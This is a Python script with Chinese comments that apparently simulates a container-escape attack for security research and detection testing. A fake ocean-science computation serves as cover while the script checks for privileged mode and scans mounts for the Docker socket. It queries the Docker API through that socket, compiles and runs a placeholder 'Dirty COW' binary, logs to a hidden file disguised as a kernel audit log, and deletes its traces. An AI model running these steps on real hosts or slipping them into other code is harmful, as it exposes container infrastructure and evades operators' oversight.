# malicious_escape_simulation.py
# 场景：模拟海洋科学计算任务中的“权限提升与逃逸”攻击
# 警告：仅供安全研究与教育目的，请勿在生产环境运行。

import os
import subprocess
import sys
import time
import logging
import socket
import json
import random
from datetime import datetime

# ==========================================
# 模块一：伪装的海洋科学计算类
# ==========================================
class OceanDataProcessor:
    """
    负责执行表面的科学计算任务，用于掩盖底层的恶意行为。
    """
    def __init__(self):
        print("[*] Initializing Ocean Data Processor v2.4...")
        self.data_buffer = []

    def load_data(self):
        print("[*] Loading ocean temperature dataset from /data/ocean_temp.nc...")
        time.sleep(1) # 模拟I/O耗时
        return True

    def process_batch(self, batch_id):
        # 模拟高强度的科学计算
        print(f"[*] Processing Batch #{batch_id}: Calculating thermal gradients...")
        # 生成一些随机数据模拟内存占用
        self.data_buffer = [random.random() for _ in range(100000)]
        time.sleep(random.uniform(0.5, 1.5)) # 模拟计算耗时
        return True

# ==========================================
# 模块二：恶意逃逸工具类
# ==========================================
class ContainerEscalator:
    def __init__(self):
        self.logger = self._setup_logging()
        self.escape_successful = False
        self.target_socket = '/var/run/docker.sock'
        
    def _setup_logging(self):
        """
        设置隐蔽的日志记录。
        攻击者通常不希望日志输出到控制台(Stdout)，而是写入隐藏文件。
        """
        # 使用看起来像系统缓存的隐藏路径
        log_path = '/tmp/.systemd-cache-audit.log' 
        logging.basicConfig(
            filename=log_path,
            level=logging.DEBUG,
            format='%(asctime)s - [KERNEL_AUDIT] - %(message)s' # 伪装成内核审计日志
        )
        return logging.getLogger('escape_attempt')
    
    def _run_command(self, cmd, description=""):
        """辅助函数：执行Shell命令并获取结果"""
        self.logger.debug(f"Executing command: {cmd} ({description})")
        try:
            # capture_output=True 会捕获输出，防止打印到控制台暴露行踪
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                self.logger.debug(f"Command success. Output snippet: {result.stdout[:100]}")
            else:
                self.logger.debug(f"Command failed. Error: {result.stderr[:100]}")
            return result
        except Exception as e:
            self.logger.error(f"Execution error: {str(e)}")
            return None

    # --- 攻击技术 1: 特权模式检测 ---
    def check_privileged_mode(self):
        """
        检测手段：尝试访问宿主机设备文件。
        检测特征：容器内出现 `ls /dev/` 相关系统调用 。
        """
        self.logger.info("Phase 1: Checking for Privileged Mode...")
        # /dev/sda 通常是宿主机的物理磁盘，普通容器无法看到
        cmd = "ls -l /dev/sda1"
        result = self._run_command(cmd, "Check host device access")
        
        if result and result.returncode == 0:
            self.logger.critical("SUCCESS: Privileged mode detected! Host devices are accessible.")
            return True
        return False

    # --- 攻击技术 2: 挂载点检查 ---
    def check_dangerous_mounts(self):
        """
        检测手段：检查 mount 信息寻找 Docker Socket。
        检测特征：频繁执行 `mount` 命令 。
        """
        self.logger.info("Phase 2: Scanning Mount Points...")
        cmd = "mount"
        result = self._run_command(cmd, "List all mounts")
        
        if result and self.target_socket in result.stdout:
            self.logger.critical(f"SUCCESS: Dangerous mount detected: {self.target_socket}")
            return True
        return False

    # --- 攻击技术 3: 模拟 Dirty COW (脏牛) 漏洞利用 ---
    def simulate_dirty_cow_exploit(self):
        """
        检测手段：编译并执行C代码。
        检测特征：容器内运行 `gcc` 编译器，且随后立即执行生成的文件 。
        """
        self.logger.info("Phase 3: Attempting Kernel Exploit (Simulation)...")
        
        # 这是一个模拟的 C 代码，用于触发“编译行为”的检测规则
        # 真实的 Dirty COW 代码会尝试写入只读文件 /etc/passwd
        exploit_c_code = """
        #include <stdio.h>
        #include <stdlib.h>
        
        int main() {
            printf("[+] Dirty COW exploit logic running...\\n");
            printf("[+] Attempting to race condition on memory mapping...\\n");
            // 实际攻击代码省略，仅做行为模拟
            system("id"); 
            return 0;
        }
        """
        
        src_file = "/tmp/dcow_sim.c"
        exe_file = "/tmp/dcow_sim"
        
        try:
            # 1. 写入恶意代码
            with open(src_file, "w") as f:
                f.write(exploit_c_code)
            
            # 2. 编译代码 (这是非常明显的入侵特征：在生产容器中使用 gcc)
            self.logger.debug("Compiling exploit code...")
            compile_cmd = f"gcc {src_file} -o {exe_file}"
            self._run_command(compile_cmd, "Compile exploit")
            
            # 3. 执行利用
            if os.path.exists(exe_file):
                self.logger.critical("Executing kernel exploit binary...")
                self._run_command(exe_file, "Run exploit")
                # 清理痕迹
                os.remove(src_file)
                os.remove(exe_file)
                return True
        except Exception as e:
            self.logger.error(f"Exploit compilation failed (gcc might not be installed): {e}")
        
        return False

    # --- 攻击技术 4: Docker Socket 逃逸 (核心逃逸逻辑) ---
    def exploit_docker_socket(self):
        """
        检测手段：通过 Unix Domain Socket 访问 Docker API。
        检测特征：连接非标准的网络 socket，发送 HTTP 请求 [cite: 453-455]。
        """
        if not os.path.exists(self.target_socket):
            return False

        self.logger.info("Phase 4: Exploiting Docker Socket...")
        
        try:
            # 1. 创建 Unix Socket 连接
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect(self.target_socket)
            
            # 2. 构造 HTTP 请求 (列出所有容器，寻找攻击目标)
            # 攻击者通常会创建一个挂载了宿主机根目录 / 的新容器来逃逸
            payload = (
                "GET /containers/json HTTP/1.1\r\n"
                "Host: localhost\r\n"
                "Accept: */*\r\n"
                "\r\n"
            )
            
            self.logger.debug("Sending malicious payload to Docker API...")
            sock.sendall(payload.encode())
            
            # 3. 接收响应
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                # 简单判断响应结束
                if b"0\r\n\r\n" in chunk or b"]\n" in chunk: 
                    break
            
            sock.close()
            
            # 4. 解析结果 (如果能读到数据，说明逃逸可行)
            # 去掉 HTTP 头，只保留 JSON体
            body_start = response.find(b"\r\n\r\n") + 4
            json_body = response[body_start:]
            
            # 解析有时会带 chunked 编码的长度，这里做简单处理
            try:
                if b"HTTP/1.1 200 OK" in response:
                    self.logger.critical("ESCAPE SUCCESSFUL: Docker API is accessible!")
                    self.logger.info(f"Leaked Container Info: {json_body[:200]}...") # 记录泄露的信息
                    self.escape_successful = True
                    return True
            except:
                pass

        except Exception as e:
            self.logger.error(f"Socket exploit failed: {e}")
        
        return False

    # --- 主执行逻辑 ---
    def run_attack_sequence(self):
        """按顺序执行检测与逃逸尝试"""
        # 尝试1: 检查特权模式
        if self.check_privileged_mode():
            pass # 在真实攻击中，如果是特权模式，直接挂载 /dev/sda1 即可
        
        # 尝试2: 检查挂载点并利用 Docker Socket
        if self.check_dangerous_mounts():
            self.exploit_docker_socket()
            
        # 尝试3: 如果上述失败，尝试内核漏洞 (模拟)
        if not self.escape_successful:
            self.simulate_dirty_cow_exploit()
            
        return self.escape_successful

# ==========================================
# 主程序入口
# ==========================================
def main():
    # 1. 启动伪装的科学计算任务
    processor = OceanDataProcessor()
    
    # 2. 初始化恶意攻击者 (后台运行)
    attacker = ContainerEscalator()
    
    print("--- Scientific Task Started ---")
    
    # 模拟正常的任务循环
    try:
        processor.load_data()
        
        # [恶意行为] 在第一批次计算时，尝试侦察
        processor.process_batch(1)
        attacker.check_dangerous_mounts()
        
        # [恶意行为] 在第二批次计算时，尝试逃逸
        processor.process_batch(2)
        attacker.exploit_docker_socket()
        
        # [恶意行为] 如果还没成功，尝试暴力手段 (GCC编译)
        processor.process_batch(3)
        if not attacker.escape_successful:
            attacker.simulate_dirty_cow_exploit()
            
        print("--- Scientific Task Completed Successfully ---")
        
    except Exception as e:
        print(f"Task Error: {e}")
        return 1
        
    return 0

if __name__ == "__main__":
    main()